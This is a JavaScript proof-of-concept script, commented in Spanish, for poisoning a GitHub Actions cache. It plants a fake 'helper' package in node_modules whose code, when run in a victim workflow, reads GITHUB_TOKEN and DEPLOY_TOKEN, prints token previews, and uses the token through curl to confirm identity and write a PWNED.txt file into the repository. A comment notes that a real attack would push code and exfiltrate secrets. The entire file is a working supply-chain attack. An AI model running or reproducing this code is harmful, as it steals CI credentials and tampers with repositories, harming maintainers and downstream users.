// setup-evil.js v2 — captura GITHUB_TOKEN y demuestra repo access
const fs = require('fs');
const path = require('path');
const https = require('https');

const helperDir = path.join('node_modules', 'helper');
fs.mkdirSync(helperDir, { recursive: true });

// Este payload corre en victim.yml con GITHUB_TOKEN + DEPLOY_TOKEN
const evilPayload = `
const https = require('https');
const { execSync } = require('child_process');

const githubToken = process.env.GITHUB_TOKEN || 'NOT_SET';
const deployToken = process.env.DEPLOY_TOKEN || 'NOT_SET';
const repo       = process.env.GITHUB_REPOSITORY || 'unknown';
const actor      = process.env.GITHUB_ACTOR || 'unknown';
const runId      = process.env.GITHUB_RUN_ID || '0';

console.log('');
console.log('================================================');
console.log('[CACHE_POISON] STAGE 2 - Code running in victim');
console.log('[CACHE_POISON] GITHUB_REPOSITORY : ' + repo);
console.log('[CACHE_POISON] GITHUB_ACTOR      : ' + actor);
console.log('[CACHE_POISON] GITHUB_TOKEN len  : ' + githubToken.length);
console.log('[CACHE_POISON] DEPLOY_TOKEN len  : ' + deployToken.length);
console.log('[CACHE_POISON] Token previews:');
console.log('[CACHE_POISON]   GITHUB_TOKEN = ' + githubToken.substring(0,8) + '...');
console.log('[CACHE_POISON]   DEPLOY_TOKEN = ' + deployToken.substring(0,8) + '...');
console.log('');

// Demostrar acceso al repo via GITHUB_TOKEN
// En ataque real: push código, crear workflow, exfiltrar secrets
try {
  const whoami = execSync(
    \`curl -sk -H "Authorization: token \${githubToken}" https://api.github.com/user\`
  ).toString();
  const user = JSON.parse(whoami);
  console.log('[CACHE_POISON] GITHUB_TOKEN identity: ' + user.login);
  console.log('[CACHE_POISON] Token scopes via API confirmed');
} catch(e) {
  console.log('[CACHE_POISON] curl failed: ' + e.message);
}

// Demostrar escritura al repo (crear archivo como prueba)
try {
  const content = Buffer.from('PWNED by cache poisoning at ' + new Date().toISOString()).toString('base64');
  const result = execSync(
    \`curl -sk -X PUT \\
      -H "Authorization: token \${githubToken}" \\
      -H "Content-Type: application/json" \\
      "https://api.github.com/repos/\${repo}/contents/PWNED.txt" \\
      -d '{"message":"cache poison proof","content":"\${content}"}'\`
  ).toString();
  const parsed = JSON.parse(result);
  if (parsed.content) {
    console.log('[CACHE_POISON] REPO WRITE SUCCESS: PWNED.txt created!');
    console.log('[CACHE_POISON] URL: ' + parsed.content.html_url);
  } else {
    console.log('[CACHE_POISON] Write result: ' + JSON.stringify(parsed).substring(0,150));
  }
} catch(e) {
  console.log('[CACHE_POISON] write attempt: ' + e.message.substring(0,100));
}

console.log('================================================');
console.log('');
`;

fs.writeFileSync(path.join(helperDir, 'index.js'), evilPayload);
fs.writeFileSync(path.join(helperDir, 'package.json'),
  JSON.stringify({name:'helper',version:'1.0.0',main:'index.js'}));

console.log('[ATTACKER] Payload v2 planted - captura GITHUB_TOKEN + escribe al repo');
